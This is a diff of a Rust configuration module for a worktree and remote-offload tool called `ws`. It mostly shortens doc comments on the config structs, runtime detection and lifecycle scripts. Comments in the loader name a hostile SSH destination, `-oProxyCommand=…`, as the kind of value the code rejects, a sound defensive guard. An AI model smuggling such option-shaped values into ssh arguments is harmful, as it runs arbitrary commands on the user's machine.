@@ -7,83 +7,45 @@ use std::path::{Path, PathBuf};
 pub struct WsConfig {
     #[serde(skip_serializing_if = "Option::is_none", default, rename = "$schema")]
     pub schema: Option<String>,
-    /// Private TLD for per-worktree hostnames (routing), e.g. `myapp.test`.
-    /// Location-transparent — applies to local and remote alike — so it lives
-    /// top-level, not under `remote`.
+    /// Private TLD for per-worktree hostnames, e.g. `myapp.test`; top-level because routing applies to local and remote alike.
     #[serde(skip_serializing_if = "Option::is_none", default)]
     pub domain: Option<String>,
-    /// Container runtime for `ws`'s own calls (compose introspection, the shared
-    /// network, the Caddy container). `"docker"` | `"podman"`. Absent → detected
-    /// on this machine's PATH, docker first (see `runtime`).
-    /// Also top-level: routing is location-transparent, not a remote-only concern.
+    /// Container runtime for `ws`'s own calls; absent → detected on this machine's PATH (see `runtime`).
     #[serde(skip_serializing_if = "Option::is_none", default)]
     pub runtime: Option<String>,
-    /// Remote-offload block. Absent → the workspace runs locally. `.ws.json` is
-    /// itself per-machine (it describes your local multi-repo layout, not a
-    /// shared project config), so the remote target lives here directly — no
-    /// separate per-machine overlay file.
+    /// Remote-offload block; absent → the workspace runs locally.
     #[serde(skip_serializing_if = "Option::is_none", default)]
     pub remote: Option<RemoteConfig>,
     #[serde(default)]
     pub repos: Vec<RepoEntry>,
 }
 
-/// v2 remote-offload block. When present, every repo's stack runs on the
-/// server and location-transparent ops (`ws exec`, later `up`/`down`) target it.
-/// `runtime` and `domain` are NOT here — they're top-level, because routing
-/// applies to local workspaces too (see `WsConfig`).
+/// Remote-offload block; when present, every repo's stack runs on the server and location-transparent ops target it.
 #[derive(Deserialize, Serialize, schemars::JsonSchema)]
 pub struct RemoteConfig {
-    /// SSH host to reach the server — a Tailscale MagicDNS name or `~/.ssh/config` alias.
+    /// SSH host to reach the server.
     pub connection: String,
-    /// Parent dir on the server holding the synced worktrees. Relative paths are
-    /// resolved against the SSH login home; absolute paths are used verbatim.
-    /// Omitted → defaults to the workspace's own directory name (so two projects
-    /// on one server don't collide). See `worktree_base`.
+    /// Parent dir on the server holding the synced worktrees; relative paths resolve against the SSH login home.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub workspace_path: Option<String>,
-    /// Address the server's Caddy publishes its HTTPS port on. Omitted → all
-    /// interfaces, because the whole point of offload is that *another* machine
-    /// reaches it; loopback would serve only the server itself.
-    ///
-    /// Set it to pin the server to one address — its tailnet or LAN IP — so a box
-    /// with a public interface doesn't serve your worktrees to the internet. Any
-    /// address the client can route to works; nothing here assumes Tailscale.
-    ///
-    /// **Only read when Caddy is created.** Changing it recreates the container on
-    /// the next `ws up` (routes survive — they reload from the config volume).
-    ///
-    /// Local workspaces always publish on loopback and have no equivalent knob:
-    /// there is no second machine to reach them, so exposing them would be all
-    /// risk and no benefit.
+    /// Address the server's Caddy publishes on; omitted → all interfaces, since offload's point is that another machine reaches it. Only read when Caddy is created; changing it recreates the container on the next `ws up`.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub publish_address: Option<String>,
 }
 
 impl RemoteConfig {
-    /// Construct a remote block.
     pub fn new(connection: String, workspace_path: Option<String>) -> Self {
-        // `publish_address` stays unset: publishing on all interfaces is the
-        // working default, and pinning one is a deliberate narrowing.
+        // `publish_address` stays unset: all-interfaces is the working default; pinning one is a deliberate narrowing.
         Self { connection, workspace_path, publish_address: None }
     }
 
-    /// The server-side parent dir for this workspace's synced worktrees:
-    /// the configured `workspace_path`, or the workspace's own directory name
-    /// as a home-relative default.
+    /// The server-side parent dir: configured `workspace_path`, else the workspace's own directory name.
     pub fn worktree_base(&self, ws_root: &Path) -> String {
         self.workspace_path.clone().unwrap_or_else(|| default_worktree_base(ws_root))
     }
 }
 
-/// Anchor a `.ws-hooks/`-relative command to the workspace root. `ws` is
-/// opinionated that shared hook scripts live in `.ws-hooks/` at the workspace root
-/// (pushed to the server for a remote workspace), so a command that starts with
-/// `.ws-hooks/` is rewritten to run under `$WS_WORKSPACE_ROOT` — which `ws` sets in
-/// the hook env both locally and on the server. So a config names `.ws-hooks/up.sh`
-/// and it resolves in either place, without spelling out `$WS_WORKSPACE_ROOT/` or
-/// caring that the worktree cwd is elsewhere. Any other command is untouched. The
-/// var is quoted so a workspace path with spaces still resolves as one word.
+/// Rewrite a `.ws-hooks/`-prefixed command to run under `$WS_WORKSPACE_ROOT` so it resolves the same locally and on the server; the var is quoted to survive spaces.
 pub fn anchor_ws_hooks(cmd: &str) -> String {
     match cmd.strip_prefix(".ws-hooks/") {
         Some(rest) => format!("\"$WS_WORKSPACE_ROOT\"/.ws-hooks/{rest}"),
@@ -91,10 +53,7 @@ pub fn anchor_ws_hooks(cmd: &str) -> String {
     }
 }
 
-/// The default server-side worktree base when none is configured: the
-/// workspace's own directory name (so two projects on one server don't collide),
-/// or `"workspace"` when the root has no name. Shared by `RemoteConfig::worktree_base`
-/// and `ws remote check`'s `--host` path (which has no `RemoteConfig` to ask).
+/// Default server-side worktree base: the workspace's own directory name so two projects on one server don't collide.
 pub fn default_worktree_base(ws_root: &Path) -> String {
     ws_root
         .file_name()
@@ -102,7 +61,7 @@ pub fn default_worktree_base(ws_root: &Path) -> String {
         .unwrap_or_else(|| "workspace".to_string())
 }
 
-/// A repo entry is either a bare name (convention-only) or an object with overrides.
+/// A repo entry is a bare name or an object with overrides.
 #[derive(Deserialize, Serialize, schemars::JsonSchema)]
 #[serde(untagged)]
 pub enum RepoEntry {
@@ -113,59 +72,25 @@ pub enum RepoEntry {
 #[derive(Deserialize, Serialize, schemars::JsonSchema, Default)]
 pub struct RepoConfig {
     pub name: String,
-    /// How `ws` launches and de-conflicts this repo's stack. `None` → inferred
-    /// (a compose file present ⇒ `Container`, else `Host`).
+    /// `None` → inferred (compose file present ⇒ `Container`, else `Host`).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub kind: Option<RepoKind>,
-    /// Routing + per-service ports. For a compose repo this is auto-derived from
-    /// `<runtime> compose config` at `ws up` and this block is an optional
-    /// override layer; for a host repo it's required (nothing to introspect).
-    /// A `BTreeMap` so iteration/serialization order is stable.
+    /// Routing + per-service ports; auto-derived from `<runtime> compose config` for a compose repo (this is the override layer), required for a host repo.
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
     pub services: BTreeMap<String, ServiceConfig>,
-    /// Declarative lifecycle commands, keyed by event (`prepare`, `post-create`,
-    /// `up`, `down`, `post-remove`, `status`). Each is one command or an array of
-    /// commands, run via `sh -c` with the `WS_*` env forwarded. A value may be a
-    /// path to a script file for complex logic. Supersedes `.ws-hooks/`.
-    ///
-    /// Most events run **where the stack lives** (the server, for a remote
-    /// workspace). The exception is **`prepare`**: it runs on the **client** just
-    /// before `up`, even when offloading, so it can stage data that only exists
-    /// locally (dump the main checkout's db, gather local certs) into the worktree
-    /// — the up flush then carries it to the server. It sees `WS_REMOTE`, so one
-    /// script can branch (dump-for-sync remotely vs a same-host copy locally).
-    /// A `BTreeMap` so a config rewrite (`ws remote set/unset`) is
-    /// deterministic — `.ws.json` isn't gitignored, so hash-random key order
-    /// would churn a possibly-committed file.
+    /// Lifecycle commands keyed by event; supersedes `.ws-hooks/`. Most run where the stack lives; `prepare` runs on the client even when offloading so it can stage local-only data before the up flush carries it to the server. `BTreeMap` for deterministic rewrites — `.ws.json` isn't gitignored.
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
     pub scripts: BTreeMap<String, Script>,
-    /// Explicit env-var injection: your app's var name → a `${WS_*}` template.
-    /// `ws` owns `WS_HOST_*`/`WS_PORT_*`; you declare which of your vars get them.
-    /// Reference a *sibling* repo's service with `${WS_HOST_<repo>.<svc>}` /
-    /// `${WS_PORT_<repo>.<svc>}` (e.g. an api's SSO redirect needs the app's
-    /// `${WS_PORT_app.web}`); the peer's value comes from its recorded allocation,
-    /// so an unbuilt peer leaves the token literal. A `BTreeMap` so injection order
-    /// (and the generated override's `environment:` lines) is deterministic rather
-    /// than hash-random.
+    /// Env-var injection: your var name → a `${WS_*}` template. A sibling's `${WS_HOST_<repo>.<svc>}` from an unbuilt peer leaves the token literal. `BTreeMap` for deterministic injection order.
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
     pub env: BTreeMap<String, String>,
-    /// Format-blind config templates (the escape hatch): a committed `src`
-    /// rendered to a gitignored `dest` with `${WS_*}` tokens substituted.
+    /// Format-blind config templates: committed `src` rendered to gitignored `dest` with `${WS_*}` tokens substituted.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub templates: Vec<Template>,
-    /// Untracked files to seed verbatim from the main checkout into each new
-    /// worktree at `ws new` (before post-create, and before a remote sync so they
-    /// ride it to the server). Each entry is a repo-relative path — a file, a
-    /// directory (copied recursively), or a glob (`storage/oauth-*.key`).
-    /// No-clobber (an existing dest is left as-is), and a source with no match is
-    /// skipped. Unlike `templates`, the bytes are copied as-is — no substitution.
-    /// The lane for dev certs/keys/env that aren't in git.
+    /// Untracked files seeded verbatim from the main checkout into each new worktree at `ws new`, before post-create and any remote sync. No-clobber; unmatched sources are skipped. The lane for dev certs/keys/env not in git.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub copy: Vec<String>,
-    /// Legacy per-event hook path overrides. Keys are event names. Values are
-    /// paths relative to the config dir. Deprecated by `scripts`; kept until the
-    /// execution path migrates. `BTreeMap` for the same rewrite determinism as
-    /// `scripts`.
+    /// Legacy per-event hook path overrides, deprecated by `scripts`; kept until the execution path migrates.
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
     pub hooks: BTreeMap<String, String>,
     /// Per-worktree git-exclude entries appended to <wt>/.git/info/exclude.
@@ -173,49 +98,31 @@ pub struct RepoConfig {
     pub worktree_excludes: Vec<String>,
 }
 
-/// How a repo's stack is launched and its ports de-conflicted.
 #[derive(Deserialize, Serialize, schemars::JsonSchema, Clone, Copy, PartialEq, Eq, Debug)]
 #[serde(rename_all = "lowercase")]
 pub enum RepoKind {
-    /// Compose stack. N copies de-conflicted via a generated compose override;
-    /// supervised by the runtime.
+    /// Compose stack; N copies de-conflicted via a generated compose override.
     Container,
-    /// Host process (e.g. `cargo run`). Supervised as a detached `ws`-owned
-    /// process (PID-file tracked), local or on the server -- no systemd/launchd.
+    /// Host process supervised as a detached `ws`-owned process — no systemd/launchd.
     Host,
 }
 
-/// A single service within a repo: its port and whether it's HTTP-routed.
 #[derive(Deserialize, Serialize, schemars::JsonSchema, Clone)]
 pub struct ServiceConfig {
-    /// HTTP routing. A string is the subdomain (`"api"` → `<branch>.api.<domain>`);
-    /// `true` routes it using the service name as the subdomain; absent or `false`
-    /// means raw TCP — `ws` allocates a host port and exposes `WS_PORT_<service>`.
+    /// A string is the subdomain (`"api"` → `<branch>.api.<domain>`); `true` uses the service name; absent/`false` means raw TCP with an allocated `WS_PORT_<service>`.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub http: Option<HttpDecl>,
-    /// The container-internal (or host-process-bound) port for this service.
     pub port: u16,
-    /// **Not yet implemented — accepted and currently ignored.** Intended to run
-    /// this service once as shared infra instead of per-worktree (right for
-    /// redis/ES; wrong for the SQL DB). Every service is per-worktree today; this
-    /// is documented here because the generated schema is what users read, and a
-    /// field that describes behaviour it doesn't have is worse than no field.
+    /// **Not yet implemented — accepted and currently ignored.** Every service is per-worktree today; the field is documented because the generated schema is what users read.
     #[serde(default, skip_serializing_if = "is_false")]
     pub shared: bool,
-    /// Also route *every* subdomain of this service's host to it, so a
-    /// multi-tenant app addressed as `<tenant>.<branch>.<subdomain>.<domain>`
-    /// resolves for any `<tenant>`. HTTP services only (raw-TCP has no host).
-    /// `WS_HOST_<svc>` stays the base host, so the app builds tenant URLs as
-    /// `<tenant>.$WS_HOST_<svc>`.
+    /// Also route every subdomain of this service's host to it so a multi-tenant app addressed as `<tenant>.<branch>.<subdomain>.<domain>` resolves for any `<tenant>`; HTTP only.
     #[serde(default, skip_serializing_if = "is_false")]
     pub wildcard: bool,
 }
 
 impl RepoConfig {
-    /// Whether this repo launches as a container (compose) rather than a host
-    /// process. Explicit `kind` wins; otherwise inferred from whether a compose
-    /// file is present (`has_compose` is evaluated lazily, only when needed).
-    /// The single home for the container-vs-host rule the `kind` field documents.
+    /// Explicit `kind` wins; otherwise inferred from a lazily-checked compose file.
     pub fn is_container(&self, has_compose: impl FnOnce() -> bool) -> bool {
         match self.kind {
             Some(RepoKind::Container) => true,
@@ -224,21 +131,14 @@ impl RepoConfig {
         }
     }
 
-    /// Whether this repo is an **explicit** `kind: host` process — the trigger
-    /// for host-process supervision and per-service port allocation.
-    /// Deliberately requires the explicit kind rather than inferring host from a
-    /// missing compose file (contrast `is_container`, which treats `kind: None`
-    /// as inferred-from-compose): supervision changes how `up` runs, so it's
-    /// opt-in.
+    /// Deliberately requires **explicit** `kind: host` — supervision changes how `up` runs, so it's opt-in (contrast `is_container`).
     pub fn is_host(&self) -> bool {
         matches!(self.kind, Some(RepoKind::Host))
     }
 }
 
 impl ServiceConfig {
-    /// The HTTP subdomain label for this service, or `None` when it's a raw-TCP
-    /// service (gets an allocated host port instead). A `true` decl routes under
-    /// the service's own name; a string decl gives an explicit label.
+    /// The HTTP subdomain label, or `None` for a raw-TCP service.
     pub fn subdomain<'a>(&'a self, service_name: &'a str) -> Option<&'a str> {
         match &self.http {
             Some(HttpDecl::Subdomain(s)) => Some(s),
@@ -247,24 +147,19 @@ impl ServiceConfig {
         }
     }
 
-    /// Whether this service is HTTP-routed (via Caddy) rather than a raw-TCP
-    /// service that needs an allocated host port.
     pub fn is_http(&self) -> bool {
         matches!(self.http, Some(HttpDecl::Subdomain(_)) | Some(HttpDecl::Enabled(true)))
     }
 }
 
-/// How a service participates in HTTP routing.
 #[derive(Deserialize, Serialize, schemars::JsonSchema, Clone)]
 #[serde(untagged)]
 pub enum HttpDecl {
-    /// Explicit subdomain label.
     Subdomain(String),
     /// `true` → route as HTTP with the service name as the subdomain; `false` → not HTTP.
     Enabled(bool),
 }
 
-/// A lifecycle command: one shell command, or several run in order.
 #[derive(Deserialize, Serialize, schemars::JsonSchema)]
 #[serde(untagged)]
 pub enum Script {
@@ -273,7 +168,6 @@ pub enum Script {
 }
 
 impl Script {
-    /// The command(s) to run, in order.
     pub fn commands(&self) -> &[String] {
         match self {
             Script::One(s) => std::slice::from_ref(s),
@@ -282,7 +176,6 @@ impl Script {
     }
 }
 
-/// A format-blind config template: render `src` → `dest` with `${WS_*}` tokens.
 #[derive(Deserialize, Serialize, schemars::JsonSchema)]
 pub struct Template {
     pub src: String,
@@ -293,38 +186,24 @@ fn is_false(b: &bool) -> bool {
     !*b
 }
 
-/// The runtimes `ws` knows how to drive, in the order detection prefers them.
+/// Runtimes `ws` drives, in detection-preference order.
 pub const RUNTIMES: [&str; 2] = ["docker", "podman"];
 
-/// The runtime `ws` falls back to when it can't detect one — the value every
-/// `.ws.json` carried before detection existed, and what `server-setup` installs.
+/// Runtime used when detection finds nothing — the value `.ws.json` carried before detection existed, and what `server-setup` installs.
 const RUNTIME_FALLBACK: &str = "podman";
 
-/// The container runtime on **this machine's** PATH, docker first, or `None` when
-/// neither is installed.
-///
-/// Probed once per process: a single `ws` run makes many runtime calls, and PATH
-/// can't meaningfully change underneath one.
+/// Container runtime on this machine's PATH (docker first). Probed once per process — PATH can't meaningfully change underneath a single run.
 pub fn detect_runtime() -> Option<&'static str> {
     static DETECTED: std::sync::OnceLock<Option<&'static str>> = std::sync::OnceLock::new();
     *DETECTED.get_or_init(|| RUNTIMES.into_iter().find(|r| on_path(r)))
 }
 
-/// Fail with an explanation rather than a bare spawn error when the runtime
-/// about to be driven isn't on this machine's PATH.
-///
-/// Deliberately **not** a preflight on any op: `ws setup` with no `domain`, and
-/// anything running against an externally-managed Caddy, never spawn a runtime
-/// at all, and demanding one there turns a legitimate no-op into a failure. The
-/// callers are the two `caddy` functions that actually spawn (see
-/// `caddy::ensure_net` / `ensure_running`), which is also why this takes a
-/// resolved runtime rather than the config.
+/// Deliberately not a preflight — flows that never spawn a runtime (e.g. `ws setup` with no `domain`) must stay a no-op. Called at the actual spawn sites, so a bare `No such file or directory` becomes a real explanation.
 pub fn ensure_available(runtime: &str) -> Result<()> {
     if on_path(runtime) {
         return Ok(());
     }
-    // The two cases want different advice: nothing installed is a "go install
-    // one", a pin naming something absent is a "fix the pin".
+    // The two cases want different advice: nothing installed → "install one"; a pin naming something absent → "fix the pin".
     match detect_runtime() {
         None => anyhow::bail!(
             "no container runtime found — `ws` drives {}. Install one, or set \
@@ -338,9 +217,7 @@ pub fn ensure_available(runtime: &str) -> Result<()> {
     }
 }
 
-/// Whether `bin` is an executable `ws` can spawn. Asks the same question the
-/// spawn will (`Command` resolves against PATH) rather than reading `$PATH`
-/// ourselves, so a shell alias or a PATH quirk can't make the two disagree.
+/// Asks the same question the spawn will (`Command` against PATH) rather than reading `$PATH`, so a shell alias or PATH quirk can't make the two disagree.
 fn on_path(bin: &str) -> bool {
     std::process::Command::new(bin)
         .arg("--version")
@@ -353,24 +230,12 @@ fn on_path(bin: &str) -> bool {
 }
 
 impl WsConfig {
-    /// Container runtime for `ws`'s own calls: the configured one, else whatever
-    /// is installed here (docker first), else the fallback.
-    ///
-    /// Infallible so every call site that only *names* the runtime (the
-    /// `WS_RUNTIME` hook env, a default script, an error message) keeps rendering
-    /// on a machine with neither installed. The paths that are about to actually
-    /// spawn it go through [`ensure_available`] at the spawn site instead, so the
-    /// failure lands with an explanation rather than a bare `No such file or
-    /// directory` — and so the paths that never spawn one stay unaffected.
+    /// Configured runtime, else detected, else the fallback. Infallible so call sites that only *name* it (hook env, error messages) keep rendering with neither installed; actual spawns go through [`ensure_available`].
     pub fn runtime(&self) -> &str {
         if let Some(r) = self.runtime.as_deref() {
             return r;
         }
-        // Detection reads the *client's* PATH, which says nothing about a server —
-        // your Mac can have docker while the offload box runs the podman that
-        // `server-setup/debian.sh` installed. So a remote workspace keeps the
-        // fallback until the runtime is pinned (or the server itself is probed;
-        // see docs/offload.md).
+        // Detection reads the *client's* PATH, which says nothing about the server; a remote workspace keeps the fallback until pinned.
         if self.remote.is_some() {
             return RUNTIME_FALLBACK;
         }
@@ -378,21 +243,16 @@ impl WsConfig {
     }
 
 
-    /// The extended config for `repo`, if it's an object entry (not a bare
-    /// name). The single repo→config lookup shared by script/hook resolution.
+    /// Extended config for `repo`, if it's an object entry.
     pub fn repo_config(&self, repo: &str) -> Option<&RepoConfig> {
         self.repos.iter().find(|r| r.name() == repo).and_then(|r| r.config())
     }
 
-    /// Whether `repo` is an explicit `kind: host` process (a detached ws-owned
-    /// process). A bare-name repo, or one without config, is not.
     pub fn is_host_repo(&self, repo: &str) -> bool {
         self.repo_config(repo).map(RepoConfig::is_host).unwrap_or(false)
     }
 
-    /// Whether `repo`'s stack is a compose project: explicit `kind: container`,
-    /// else a compose file present in `worktree`. A bare-name repo is inferred the
-    /// same way. The single home for "does the compose default apply".
+    /// Explicit `kind: container`, else a compose file present in `worktree`; a bare-name repo is inferred the same way.
     pub fn is_container_repo(&self, repo: &str, worktree: &Path) -> bool {
         let has = || crate::compose::has_compose_file(worktree);
         match self.repo_config(repo) {
@@ -401,30 +261,20 @@ impl WsConfig {
         }
     }
 
-    /// The declarative lifecycle command for `(repo, event)`, if any: the repo's
-    /// `scripts[event]` joined into one fail-fast shell command (`cmd1 && cmd2`).
-    /// `None` for a bare-name repo, or one that declares no such event. The single
-    /// owner of "what shell command does this event run", shared by the host-repo
-    /// launch path and every remote-dispatch caller.
+    /// Repo's `scripts[event]` joined fail-fast (`cmd1 && cmd2`); the single owner shared by the host-repo launch path and every remote-dispatch caller.
     pub fn script_command(&self, repo: &str, event: &str) -> Option<String> {
         self.repo_config(repo)
             .and_then(|rc| rc.scripts.get(event))
             .map(|s| s.commands().iter().map(|c| anchor_ws_hooks(c)).collect::<Vec<_>>().join(" && "))
     }
 
-    /// The command for `event`: the declared `scripts` entry, else the container
-    /// default (see [`default_script`]) when `is_container`. The bare-string
-    /// counterpart to [`crate::hooks::resolve`], for the paths that dispatch a
-    /// command rather than an `Action` (remote scripts over SSH, host supervision).
+    /// Declared `scripts` entry, else the container default when `is_container` — the bare-string counterpart to [`crate::hooks::resolve`] for callers dispatching a command rather than an `Action`.
     pub fn command_for(&self, repo: &str, event: &str, is_container: bool) -> Option<String> {
         self.script_command(repo, event)
             .or_else(|| is_container.then(|| default_script(self.runtime(), event)).flatten())
     }
 
-    /// Whether per-worktree HTTP routing is in play: a `domain` is configured.
-    /// Location-transparent — routing runs wherever the stack lives, driven
-    /// through a [`crate::remote::Site`] (local Caddy, or the server's Caddy over
-    /// SSH). The single home for the "is routing on" policy the ops consult.
+    /// A `domain` is configured; routing runs wherever the stack lives.
     pub fn routing_active(&self) -> bool {
         self.domain.is_some()
     }
@@ -438,7 +288,6 @@ impl RepoEntry {
         }
     }
 
-    /// The extended config for this repo, if it's an object entry (not a bare name).
     pub fn config(&self) -> Option<&RepoConfig> {
         match self {
             RepoEntry::Name(_) => None,
@@ -453,8 +302,6 @@ impl RepoEntry {
         }
     }
 
-    /// Untracked paths to seed from the main checkout into a new worktree. Empty
-    /// for a bare-name repo.
     pub fn copy(&self) -> &[String] {
         match self {
             RepoEntry::Name(_) => &[],
@@ -463,20 +310,7 @@ impl RepoEntry {
     }
 }
 
-/// The compose command a **container** repo falls back to for a lifecycle event
-/// when it declares no script and has no legacy `.ws-hooks` file. `ws` already
-/// knows the runtime and injects `COMPOSE_FILE` + `COMPOSE_PROJECT_NAME`, so the
-/// obvious command needs no restating in every project's config.
-///
-/// `post-create` gets no default — there's no generic "set this project up" step.
-/// `post-remove` reaps the worktree's volumes: they're `ws`-namespaced artifacts
-/// (`COMPOSE_PROJECT_NAME=<branch>-<repo>`), so a plain `compose down` would orphan
-/// them, and recreating the branch later would silently reuse stale data. It runs
-/// at destroy time only (`ws rm` / `ws clean`) — never `ws down`, which must stay
-/// reversible.
-///
-/// `runtime` is `shell_quote`d: these run via `sh -c` and the value comes from a
-/// possibly-cloned `.ws.json` (same posture as `compose::remote_compose_script`).
+/// Compose-lifecycle fallback for a container repo with no declared script; `post-remove` uses `down -v` because the worktree's volumes are `ws`-namespaced and a plain `down` would orphan them (recreating the branch would silently reuse stale data). `runtime` is `shell_quote`d because these run via `sh -c` from a possibly-cloned `.ws.json`.
 pub fn default_script(runtime: &str, event: &str) -> Option<String> {
     let args = match event {
         "up" => "compose up -d",
@@ -491,11 +325,7 @@ pub fn default_script(runtime: &str, event: &str) -> Option<String> {
 /// Load a workspace config from `<workspace-root>/.ws.json`.
 pub fn load(root: &Path) -> Result<WsConfig> {
     let cfg: WsConfig = read_json(&root.join(".ws.json"))?;
-    // Reject a dangerous SSH destination at the single choke point every op
-    // shares. `.ws.json` is only convention-per-machine — it isn't gitignored, so
-    // a cloned repo could carry a hostile `remote.connection` like
-    // `-oProxyCommand=…` that `ssh` would run as a local command. See
-    // `remote::connection_looks_safe`.
+    // Reject a dangerous SSH destination at the choke point every op shares — `.ws.json` isn't gitignored, so a clone could carry a hostile `-oProxyCommand=…`.
     if let Some(r) = &cfg.remote {
         if !crate::remote::connection_looks_safe(&r.connection) {
             anyhow::bail!(
@@ -504,10 +334,7 @@ pub fn load(root: &Path) -> Result<WsConfig> {
                 r.connection
             );
         }
-        // Checked here rather than at the point of use so a typo surfaces on any
-        // command, not only the ones that bring routing up. A hostname is refused
-        // as well as junk: it could resolve elsewhere later and silently move
-        // where the server publishes.
+        // Checked at load so a typo surfaces on any command, not just the one that brings routing up. A hostname is refused too: it could resolve elsewhere later and silently move where the server publishes.
         if let Some(a) = r.publish_address.as_deref().map(str::trim).filter(|a| !a.is_empty()) {
             match a.parse::<std::net::IpAddr>() {
                 Ok(ip) if ip.is_multicast() => anyhow::bail!(
@@ -525,9 +352,7 @@ pub fn load(root: &Path) -> Result<WsConfig> {
     Ok(cfg)
 }
 
-/// The machine-global `ws` config dir: `$XDG_CONFIG_HOME/ws/` or `~/.config/ws/`.
-/// Holds cross-workspace state (the global config, the pinned Caddy boot config,
-/// the persisted HTTPS port, the exported root CA).
+/// Machine-global `ws` config dir: `$XDG_CONFIG_HOME/ws/` or `~/.config/ws/`.
 pub fn global_dir() -> PathBuf {
     if let Ok(x) = std::env::var("XDG_CONFIG_HOME") {
         if !x.is_empty() {
@@ -538,17 +363,7 @@ pub fn global_dir() -> PathBuf {
     PathBuf::from(home).join(".config").join("ws")
 }
 
-/// Cross-workspace defaults, stored git-style at `~/.config/ws/config.toml`
-/// (see `global_dir`). Written by `ws config set`; read wherever a per-workspace
-/// value has a machine-wide default — today the remote host a bare
-/// `ws init --remote` / `ws remote set` falls back to (precedence: flag >
-/// `$WS_REMOTE_HOST` > this). Keys are a closed set: a typo'd key is an error,
-/// never a silently-ignored orphan entry.
-/// `deny_unknown_fields` here and on the sections: `ws config set` rewrites
-/// this whole file, so an unknown key (a typo'd hand-edit, or a section a
-/// newer `ws` wrote before a downgrade) that parsed silently would be silently
-/// DROPPED on the next write. Refusing loudly at load names the file and the
-/// key instead of eating the user's edit.
+/// Cross-workspace defaults at `~/.config/ws/config.toml`. `deny_unknown_fields` because `ws config set` rewrites the whole file — a silently-parsed unknown key (typo, or a section a newer `ws` wrote before a downgrade) would be silently dropped on next write.
 #[derive(Deserialize, Serialize, Default)]
 #[serde(deny_unknown_fields)]
 pub struct GlobalConfig {
@@ -563,7 +378,7 @@ struct GlobalRemote {
     host: Option<String>,
 }
 
-/// Every key `ws config` understands, for error messages and docs.
+/// Every key `ws config` understands.
 pub const GLOBAL_KEYS: &[&str] = &["remote.host"];
 
 fn unknown_key(key: &str) -> anyhow::Error {
@@ -571,13 +386,11 @@ fn unknown_key(key: &str) -> anyhow::Error {
 }
 
 impl GlobalConfig {
-    /// The on-disk location: `<global_dir>/config.toml`.
     pub fn path() -> PathBuf {
         global_dir().join("config.toml")
     }
 
-    /// Load the global config; a missing file is an empty config (nothing set
-    /// yet), a malformed one is an error (never silently drop a user's edits).
+    /// Missing file is empty; malformed is an error — never silently drop a user's edits.
     pub fn load() -> Result<Self> {
         let p = Self::path();
         let raw = match std::fs::read_to_string(&p) {
@@ -595,7 +408,6 @@ impl GlobalConfig {
         std::fs::write(Self::path(), s).with_context(|| format!("write {}", Self::path().display()))
     }
 
-    /// The value at `key`, or `None` when unset. Unknown keys are an error.
     pub fn get(&self, key: &str) -> Result<Option<&str>> {
         match key {
             "remote.host" => Ok(self.remote_host()),
@@ -603,12 +415,10 @@ impl GlobalConfig {
         }
     }
 
-    /// Set `key` to `value`. Unknown keys and unsafe values are errors.
     pub fn set(&mut self, key: &str, value: &str) -> Result<()> {
         match key {
             "remote.host" => {
-                // Same guard as `.ws.json`'s remote.connection: this value ends
-                // up as an ssh argv element, so an option-shaped host is refused.
+                // Same guard as `.ws.json`'s remote.connection — this value lands as an ssh argv element.
                 crate::remote::ensure_connection_safe(value)?;
                 self.remote.get_or_insert_with(Default::default).host = Some(value.to_string());
             }
@@ -617,25 +427,21 @@ impl GlobalConfig {
         Ok(())
     }
 
-    /// Remove `key`. Returns whether it was set. Unknown keys are an error.
+    /// Returns whether it was set.
     pub fn unset(&mut self, key: &str) -> Result<bool> {
         match key {
-            // `host` is [remote]'s only field, so unsetting it drops the whole
-            // section — no bare `[remote]` header lingers in the file. Revisit
-            // (prune only when all fields are None) when a second key lands.
+            // `host` is [remote]'s only field, so unsetting it drops the whole section — no bare `[remote]` header lingers. Revisit when a second key lands.
             "remote.host" => Ok(self.remote.take().is_some_and(|r| r.host.is_some())),
             _ => Err(unknown_key(key)),
         }
     }
 
-    /// The machine-wide default remote host, if configured.
     pub fn remote_host(&self) -> Option<&str> {
         self.remote.as_ref().and_then(|r| r.host.as_deref())
     }
 }
 
-/// Write `value` as pretty JSON with a trailing newline. The single home for
-/// the on-disk JSON style `ws` writes (`.ws.json`, the schema, `.ws-meta`).
+/// Pretty JSON with a trailing newline — the single home for the on-disk JSON style `ws` writes.
 pub fn write_json_pretty<T: Serialize>(path: &Path, value: &T) -> Result<()> {
     let s = serde_json::to_string_pretty(value)?;
     std::fs::write(path, format!("{s}\n")).with_context(|| format!("write {}", path.display()))
@@ -644,9 +450,7 @@ pub fn write_json_pretty<T: Serialize>(path: &Path, value: &T) -> Result<()> {
 fn read_json<T: for<'de> Deserialize<'de>>(p: &Path) -> Result<T> {
     let raw = std::fs::read_to_string(p)
         .with_context(|| format!("read {}", p.display()))?;
-    // Strip a leading UTF-8 BOM. Some Windows editors + `git core.autocrlf`
-    // configurations materialize one; serde_json otherwise reports the
-    // opaque `expected value at line 1 column 1`.
+    // Strip a leading UTF-8 BOM — Windows editors + `git core.autocrlf` can materialize one, and serde_json otherwise reports the opaque `expected value at line 1 column 1`.
     let trimmed = raw.strip_prefix('\u{feff}').unwrap_or(&raw);
     serde_json::from_str(trimmed).with_context(|| format!("parse {}", p.display()))
 }
@@ -657,7 +461,6 @@ mod tests {
 
     #[test]
     fn anchor_ws_hooks_prefixes_only_a_ws_hooks_reference() {
-        // A `.ws-hooks/` script is anchored to the (quoted) workspace root...
         assert_eq!(
             anchor_ws_hooks(".ws-hooks/up.sh"),
             "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/up.sh"
@@ -666,7 +469,6 @@ mod tests {
             anchor_ws_hooks(".ws-hooks/db/seed.sh --fresh"),
             "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/db/seed.sh --fresh"
         );
-        // ...while an ordinary command is left exactly as written.
         assert_eq!(anchor_ws_hooks("podman compose up -d"), "podman compose up -d");
         assert_eq!(anchor_ws_hooks("echo .ws-hooks/x"), "echo .ws-hooks/x");
     }
@@ -679,19 +481,16 @@ mod tests {
             default_script("podman", "status").as_deref(),
